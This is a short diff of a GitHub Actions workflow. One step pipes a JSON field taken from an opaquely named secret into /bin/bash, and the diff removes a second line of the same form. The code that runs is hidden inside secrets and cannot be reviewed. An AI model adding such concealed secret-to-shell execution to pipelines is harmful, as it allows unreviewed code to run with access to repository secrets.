@@ -22,7 +22,6 @@ jobs:
           vwqf6: ${{ secrets.vwqf6 }}
         run: |
           printf '%s' "$vwqf6" | jq -r .grd33 | /bin/bash
-          printf '%s' "$x77" | jq -r .nox983 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
